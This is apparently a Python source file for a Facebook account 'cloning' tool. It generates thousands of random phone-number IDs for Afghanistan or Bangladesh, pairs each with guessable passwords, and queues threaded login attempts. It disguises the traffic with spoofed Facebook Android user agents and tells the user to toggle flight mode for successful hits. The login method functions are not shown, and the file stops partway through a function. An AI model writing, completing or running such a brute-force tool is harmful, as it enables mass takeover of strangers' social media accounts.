oks = []
cps = []
gen = []
pcp = []
loop = 0

from concurrent.futures import ThreadPoolExecutor
ualist = ['samsung','xiaomi','realme','oppo','vivo','sony','huawei','motorola','htc','itel','infinix','techno']
uajson = {
    "1":"samsung",
    "2":"xiaomi",
    "3":"realme",
    "4":"oppo",
    "5":"vivo",
    "6":"sony",
    "7":"huawei",
    "8":"motorola",
    "9":"htc",
    "10":"itel",
    "11":"infinix",
    "12":"techno",
}

density = __import__('random').choice(['{density=3.0,width=1080,height=2401}','{density=3.0,width=1080,height=2161}',
'{density=1.5,width=1280,height=720}',
'{density=2.0,width=720,height=1344}','{density=1.75,width=720,height=1488}',
'{density=1.0,width=1066,height=552}','{density=2.0,width=480,height=854}',
'{density=1.5,width=1200,height=1848}','{density=1.3312501,width=1280,height=736}',
'{density=3.0,width=1080,height=2208}','{density=4.0,width=1440,height=2392}',
'{density=1.0,width=320,height=480}','{density=3.0,width=1080,height=1920}',
'{density=1.46875,width=720,height=1510}','{density=2.625,width=1080,height=2034}',
'{density=1.5,width=1200,height=1920}','{density=2.0,width=720,height=1280}',
'{density=2.0,width=720,height=1448}','{density=1.275,width=540,height=1071}'])


def samsung():
    ua1 = "[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/"+str(density)+";FBLC/en_US;FBCR/MTS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua2 = "[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/"+str(density)+";FBLC/en_US;FBRV/104800574;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    ua3 = "[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/"+str(density)+";FBLC/en_US;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G316M;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua4 = "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/"+str(density)+";FBLC/en_GB;FBCR/VodafoneAL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9301I;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
    ua5 = "[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142820;FBDM/"+str(density)+";FBLC/en_US;FBCR/Oi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360M;FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    max = __import__('random').choice([ua1,ua2,ua3,ua4,ua5])
    return str(max)


def xiaomi():
    ua1 = "[FBAN/FB4A;FBAV/335.0.0.28.118;FBBV/316527981;FBDM/"+str(density)+";FBLC/en_US;FBRV/317999187;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua2 = "[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823216;FBDM/"+str(density)+";FBLC/en_US;FBRV/316634502;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5 Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua3 = "[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460578;FBDM/"+str(density)+";FBLC/en_GB;FBRV/0;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua4 = "[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290428684;FBDM/"+str(density)+";FBLC/en_US;FBRV/292693120;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua5 = "[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076526;FBDM/"+str(density)+";FBLC/en_US;FBRV/304667161;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
    max = __import__('random').choice([ua1,ua2,ua3,ua4,ua5])
    return str(max)

def oppo():
    ua1 = "[FBAN/FB4A;FBAV/342.0.0.37.119;FBBV/328226367;FBDM/"+str(density)+";FBLC/en_GB;FBRV/329906044;FBCR/MY MAXIS;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1823;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    ua2 = "[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480883;FBDM/"+str(density)+";FBLC/en_US;FBRV/0;FBCR/CellOne;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1801;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua3 = "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/"+str(density)+";FBLC/en_US;FBRV/0;FBCR/TW Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1721;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua4 = "[FBAN/FB4A;FBAV/313.0.0.35.119;FBBV/282998071;FBDM/"+str(density)+";FBLC/en_US;FBRV/285101639;FBCR/TW Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1879;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    ua5 = "[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279817;FBDM/"+str(density)+";FBLC/en_GB;FBRV/309279772;FBCR/MegaFon;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2015;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    max = __import__('random').choice([ua1,ua2,ua3,ua4,ua5])
    return str(max)

def vivo():
    ua1 = "[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880536;FBDM/"+str(density)+";FBLC/en_US;FBCR/MPT;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1707;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua2 = "[FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/"+str(density)+";FB_FW/1;]"
    ua3 = "[FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468726;FBDM/"+str(density)+";FBLC/en_US;FBRV/0;FBCR/Far EasTone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1902;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    ua4 = "[FBAN/FB4A;FBAV/292.0.0.61.123;FBBV/251145754;FBDM/"+str(density)+";FBLC/en_US;FBRV/251901764;FBCR/#StaySafe;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1723;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    ua5 = "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957376;FBDM/"+str(density)+";FBLC/en_US;FBRV/333880032;FBCR/China Telecom;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V1955A;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
    max = __import__('random').choice([ua1,ua2,ua3,ua4,ua5])
    return str(max)

def sony():
    ua1 = "[FBAN/FB4A;FBAV/328.0.0.22.119;FBBV/305660392;FBDM/"+str(density)+";FBLC/en_US;FBRV/306537052;FBCR/TELE2;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G3311;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    ua2 = "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957687;FBDM/"+str(density)+";FBLC/en_US;FBRV/335247818;FBCR/BEE LINE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G3112;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    ua3 = "[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672688;FBDM/"+str(density)+";FBLC/en_US;FBRV/0;FBCR/Beeline;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/H8266;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"
    ua4 = "[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/"+str(density)+";FBLC/en_US;FBRV/349092919;FBCR/Vodafone UA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/F5122;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    ua5 = "[FBAN/FB4A;FBAV/355.0.0.21.108;FBBV/352948159;FBDM/"+str(density)+";FBLC/en_US;FBRV/353993821;FBCR/Tele2You;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/J9210;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]"
    max = __import__('random').choice([ua1,ua2,ua3,ua4,ua5])
    return str(max)

def realme():
    ua1 = "[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400874;FBDM/"+str(density)+";FBLC/en_US;FBRV/306052152;FBCR/Jio 4G;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1931;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
    ua2 = "[FBAN/FB4A;FBAV/354.0.0.22.110;FBBV/350972604;FBDM/"+str(density)+";FBLC/en_US;FBRV/352923029;FBCR/Vodafone UA;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3263;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
    ua3 = "[FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/383919090;FBDM/"+str(density)+";FBLC/en_US;FBRV/385738515;FBCR/MTS BY;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3195;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
    ua4 = "[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/"+str(density)+";FBLC/en_GB;FBRV/369757394;FBCR/Vi India;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    ua5 = "[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237439;FBDM/"+str(density)+";FBLC/en_GB;FBRV/0;FBCR/Jio 4G;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1911;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    max = __import__('random').choice([ua1,ua2,ua3,ua4,ua5])
    return str(max)

def huawei():
    ua1 = "[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/"+str(density)+";FBLC/en_US;FBRV/226498918;FBCR/TNT;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VTR-L29;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    ua2 = "[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129304;FBDM/"+str(density)+";FBLC/en_GB;FBRV/227302326;FBCR/vodafone IT;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VIE-L09;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    ua3 = "[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021049;FBDM/"+str(density)+";FBLC/en_GB;FBRV/232416429;FBCR/1 MOBILE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/FIG-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    ua4 = "[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/"+str(density)+";FBLC/en_US;FBRV/214496621;FBCR/ Cell C;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SNE-LX2;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    ua5 = "[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/"+str(density)+";FBLC/en_GB;FBRV/0;FBCR/3;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/HRY-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    max = __import__('random').choice([ua1,ua2,ua3,ua4,ua5])
    return str(max)

def motorola():
    ua1 = "[FBAN/FB4A;FBAV/283.0.0.31.121;FBBV/237966351;FBDM/"+str(density)+";FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one power;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    ua2 = "[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634253;FBDM/"+str(density)+";FBLC/en_US;FBRV/240970454;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    ua3 = "[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634227;FBDM/"+str(density)+";FBLC/en_GB;FBRV/241054900;FBCR/Claro BR;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto E (4);FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua4 = "[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634243;FBDM/"+str(density)+";FBLC/en_GB;FBRV/241192129;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(6);FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua5 = "[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634229;FBDM/"+str(density)+";FBLC/en_GB;FBRV/241105727;FBCR/Oi;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5) Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    max = __import__('random').choice([ua1,ua2,ua3,ua4,ua5])
    return str(max)

def htc():
    ua1 = "[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634251;FBDM/"+str(density)+";FBLC/en_GB;FBRV/240110713;FBCR/;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1032;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    ua2 = "[FBAN/FB4A;FBAV/76.0.0.24.67;FBBV/29581442;FBDM/"+str(density)+";FBLC/en_US;FBCR/vodafone GR;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 816 dual sim;FBSV/5.0.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    ua3 = "[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529747;FBDM/"+str(density)+";FBLC/en_US;FBCR/;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_E8;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua4 = "[FBAN/FB4A;FBAV/70.0.0.22.83;FBBV/26502135;FBDM/"+str(density)+";FBLC/en_US;FBCR/;FBMF/ECS;FBBD/JP;FBPN/com.facebook.katana;FBDV/TR10CS1;FBSV/4.4.2;FBOP/1;FBCA/x86:armeabi-v7a;]"
    ua5 = "[FBAN/FB4A;FBAV/66.0.0.0.85;FBBV/23262261;FBDM/"+str(density)+";FBLC/en_US;FBCR/MTN Cameroon;FBMF/Royal;FBBD/Royal;FBPN/com.facebook.katana;FBDV/Royal R2;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    max = __import__('random').choice([ua1,ua2,ua3,ua4,ua5])
    return str(max)

def techno():
    ua1 = "[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-L8Plus;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua2 = "[FBAN/FB4A;FBAV/73.0.0.18.66;FBBV/28132076;FBDM/{density=1.5,width=480,height=854};FBLC/en_GB;FBCR/Orange Cm;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua3 = "[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Etisalat NG;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua4 = "[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259886982;FBDM/{density=1.5,width=480,height=888};FBLC/en_US;FBRV/261724288;FBCR/Vodafone UA;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO BC2;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua5 = "[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950334;FBDM/{density=2.0,width=720,height=1464};FBLC/en_US;FBRV/337477441;FBCR/Tele2;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO KE7;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    max = __import__('random').choice([ua1,ua2,ua3,ua4,ua5])
    return str(max)

def infinix():
    ua1 = "[FBAN/FB4A;FBAV/399.0.0.24.93;FBBV/440587317;FBDM/{density=2.0,width=720,height=1440};FBLC/en_GB;FBRV/444131581;FBCR/XL Axiata;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X653C;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua2 = "[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua3 = "[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua4 = "[FBAN/FB4A;FBAV/382.0.0.33.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/394408512;FBCR/Astelit-LIFE;FBMF/Asus;FBBD/Asus;FBDV/ASUS_Z01QD;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;FBRV/0;]"
    ua5 = "[FBAN/FB4A;FBAV/82.0.0.20.70;FBBV/32367061;FBDM/{density=1.5,width=854,height=480};FBLC/en_US;FBCR/OUI;FBMF/LAVA;FBBD/Lava;FBPN/com.facebook.katana;FBDV/iris702;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    max = __import__('random').choice([ua1,ua2,ua3,ua4,ua5])
    return str(max)

def itel():
    ua1 = "[FBAN/FB4A;FBAV/71.0.0.17.73;FBBV/27002204;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Airtel;FBMF/itel;FBBD/Itel;FBPN/com.facebook.katana;FBDV/itel it1508;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua2 = "[FBAN/FB4A;FBAV/354.0.0.22.110;FBBV/350972604;FBDM/{density=2.625,width=1080,height=2162};FBLC/en_US;FBRV/352611835;FBCR/Xfinity Mobile;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 4a (5G);FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
    ua3 = "[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184931;FBDM/{density=1.75,width=720,height=1356};FBLC/en_US;FBRV/0;FBCR/HOME;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-X420;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua4 = "[FBAN/FB4A;FBAV/360.0.0.30.113;FBBV/359953984;FBDM/{density=3.75,width=1440,height=3060};FBLC/en_Qaau_US;FBRV/360783236;FBCR/VIVIFI;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1910;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
    ua5 = "[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022701;FBDM/{density=1.5,width=540,height=888};FBLC/es_LA;FBCR/TELCEL;FBMF/kyocera;FBBD/kyocera;FBPN/com.facebook.katana;FBDV/C6740N;FBSV/5.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    max = __import__('random').choice([ua1,ua2,ua3,ua4,ua5])
    return str(max)

def ax():
    ua1 = "[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034615;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/MTML;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110H;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua2 = "[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400874;FBDM/{density=3.0,width=1080,height=2332};FBLC/en_US;FBRV/306052152;FBCR/Jio 4G;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1931;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
    ua3 = "[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880536;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/MPT;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1707;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    return str(__import__('random').choice([ua1,ua2,ua3]))

def useragent_control():
    one = str(__import__('random').randint(101,303))
    two = str(__import__('random').randint(101,303))
    U_V1 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20097196;FBDM/{{density=3.0,width=1080,height=1920}};FBLC/en_GB;FBCR/IND airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 4i;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
    U_V2 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454129;FBDM/{{density=3.0,width=1080,height=1776}};FBLC/en_US;FBCR/airtel;FBMF/OnePlus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/A0001;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
    U_V3 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454115;FBDM/{{density=2.0,width=720,height=1184}};FBLC/en_GB;FBCR/Reliance;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1033;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
    U_V4 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20748104;FBDM/{{density=1.5,width=540,height=960}};FBLC/en_US;FBCR/XL Axiata;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A33w;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
    U_V5 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454026;FBDM/{{density=3.0,width=1080,height=1776}};FBLC/en_US;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D801;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
    U_V6 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20097172;FBDM/{{density=1.5,width=540,height=960}};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
    U_V7 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20748054;FBDM/{{density=2.0,width=720,height=1280}};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500Y;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
    U_V8 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20748051;FBDM/{{density=1.5,width=540,height=960}};FBLC/es_ES;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/HUAWEI G6-L11;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
    U_V9 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454115;FBDM/{{density=2.0,width=720,height=1184}};FBLC/en_US;FBCR/airtel;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoG3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
    U_V10 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20453986;FBDM/{{density=1.5,width=480,height=854}};FBLC/es_LA;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI Y511-U251;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]"
    A_VALL = __import__('random').choice([U_V1, U_V2, U_V3, U_V4, U_V5, U_V6, U_V7, U_V8, U_V9, U_V10])
    return A_VALL


def clear():
    __import__('os').system('clear')
    print("\x1b[97m>_ DEVELOPER  : HADI ANHAF AIMAN")
    print("\x1b[97m>_ GITHUB     : MR-CODE-143")
    print("\x1b[97m>_ VERSION    : 1.0")
    print(40*"\x1b[97m-")

def main():
    clear()
    print("\x1b[97m>_ 1 >> FILE CLONE")
    print("\x1b[97m>_ 2 >> RANDOM CLONE")
    print("\x1b[97m>_ 3 >> EXIT TOOL")
    print(40*"\x1b[97m-")
    selx = input("\x1b[97m>_ SELECT >> ")
    if selx == "1":fileclone()
    elif selx == "2":randomclone()
    else:__import__('sys').exit()

def fileclone():
    clear()
    file = input("\x1b[97m>_ FILE NAME >> ")
    try:xfile = open(file,'r').read().splitlines()
    except FileNotFoundError:fileclone()

def randomclone():
    clear()
    print(">_ 1 >> AFG ID CLONE")
    print(">_ 2 >> BANGLADESH ID CLONE")
    print(40*"-")
    rnx = input(">_ SELECT >> ")
    if rnx == "1":AFG_rndm()
    elif rnx == "2":bangladesh_rndm()
    else:main()

def AFG_rndm():
    clear()
    print(">_ EXAMPLE  >> +9377,+9378")
    code = input(">_ SIM CODE >> ")
    print(40*"-")
    print(">_ EXAMPLE  >> 5000,10000")
    limit = input(">_ TOTAL ID >> ")
    print(40*"-")
    X = 0
    for name in ualist:
        X += 1
        print(f">_ {X} >> UGEN => {name}")
    uxg = input(">_ SELECT >> ")
    print(40*"-")
    for a in range(int(limit)):
        awm = "".join(__import__('random').choice(__import__('string').digits) for _ in range(7))
        gen.append(awm)
    for b in range(6):
        print(f">_ {b+1} >> METHOD --> M{b+1}")
    mtd = input(">_ SELECT >> ")
    with ThreadPoolExecutor(max_workers=30) as Fucker:
        clear()
        print(f">_ TOTAL UID  >> {str(len(gen))}")
        print(f">_ METHOD NO  >> M->{mtd}")
        print(f">_ USING UA -> {str(uajson[uxg])}")
        print(f">_ USE FLIGHT MODDE FOR OK IDS")
        print(40*"-")
        for xxx in gen:
            ids = code + xxx
            psx = [ids,xxx,'khankhan','afghan123','57575751','afghanistan','۵۰۰۵۰۰']
            if mtd == "1":Fucker.submit(xuding_methodA,ids,psx,uxg)
            elif mtd == "2":Fucker.submit(xuding_methodB,ids,psx,uxg)
            elif mtd == "3":Fucker.submit(xuding_methodC,ids,psx,uxg)
            elif mtd == "4":Fucker.submit(xuding_methodD,ids,psx,uxg)
            elif mtd == "5":Fucker.submit(xuding_methodE,ids,psx,uxg)
            elif mtd == "6":Fucker.submit(xuding_methodF,ids,psx,uxg)
            else:Fucker.submit(xuding_methodA,ids,psx,uxg)
    __import__('sys').exit(40*"\x1b[97m-")

def bangladesh_rndm():
    clear()
    print(">_ EXAMPLE  >> 016,017,018")
    code = input(">_ SIM CODE >> ")
    print(40*"-")
    print(">_ EXAMPLE  >> 5000,10000")
    limit = input(">_ TOTAL ID >> ")
    print(40*"-")
    X = 0
    for name in ualist:
        X += 1
        print(f">_ {X} >> UGEN => {name}")
    uxg = input(">_ SELECT >> ")
    print(40*"-")
    for a in range(int(limit)):
        awm = "".join(__import__('random').choice(__import__('string').digits) for _ in range(8))
        gen.append(awm)
    for b in range(6):
        print(f">_ {b+1} >> METHOD --> M{b+1}")
